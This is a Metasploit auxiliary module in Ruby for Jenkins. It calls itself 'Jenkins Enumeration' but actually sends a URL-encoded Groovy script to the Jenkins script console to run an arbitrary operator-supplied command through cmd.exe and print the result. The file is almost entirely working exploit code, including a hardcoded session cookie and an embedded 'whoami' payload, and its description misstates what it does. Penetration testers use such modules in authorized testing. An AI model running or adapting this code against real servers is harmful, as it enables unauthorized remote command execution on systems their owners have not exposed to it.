##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# Some of this code was taken from the "jboss_vulnscan" module by: Tyler Krpata
##

require 'rex/proto/http'
require 'msf/core'
require 'rexml/document'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Jenkins Enumeration',
      'Description' => %q{
        This module enumerates a remote Jenkins installation in an unauthenticated manner, including
        host operating system and and Jenkins installation details.
      },
      'Author'      => 'Jeff McCutchan',
      'License'     => MSF_LICENSE
      ))

    register_options(
      [
        OptString.new('TARGETURI',  [ true,  "Path to Jenkins instance", "/jenkins/"]),
        OptString.new('COMMAND', [true, 'Command to run via Groovy Script']),
      ], self.class)
  end

  def run_host(ip)
    headers = {
      'Cookie' => 'JSESSIONID=1x7vleaog5ele1hte6hk6ca6bw'
    }
    command = datastore['COMMAND'].gsub("\\", "\\\\\\")
    res = send_request_cgi(
      {
      'uri'       => target_uri.path,
      'method'    => 'POST',
      'ctype'     => 'application/x-www-form-urlencoded',
      'headers'   => headers,
      'data'      => "script=def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%0D%0Adef+proc+%3D+%27cmd.exe+%2Fc+#{command}%27.execute%28%29%0D%0Aproc.consumeProcessOutput%28sout%2C+serr%29%0D%0Aproc.waitForOrKill%281000%29%0D%0Aprintln+%22out%26gt%3B+%24sout+err%26gt%3B+%24serr%22%0D%0A&json=%7B%22script%22%3A+%22def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%5Cndef+proc+%3D+%27cmd.exe+%2Fc+whoami%27.execute%28%29%5Cnproc.consumeProcessOutput%28sout%2C+serr%29%5Cnproc.waitForOrKill%281000%29%5Cnprintln+%5C%22out%26gt%3B+%24sout+err%26gt%3B+%24serr%5C%22%5Cn%22%2C+%22%22%3A+%22def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%5Cndef+proc+%3D+%27cmd.exe+%2Fc+whoami%27.execute%28%29%5Cnproc.consumeProcessOutput%28sout%2C+serr%29%22%7D&Submit=Run"
    }).to_s.gsub("err&amp;gt;", "")
   output = res.scan(/<pre>(.*?)<\/pre>/m)[1][0][12..-1].strip
   print_good("The command executed successfully on #{rhost}:#{rport}.")
   output.split("\n").each{|line| print_status("#{rhost}:#{rport}: #{line.strip}")}
  end
end
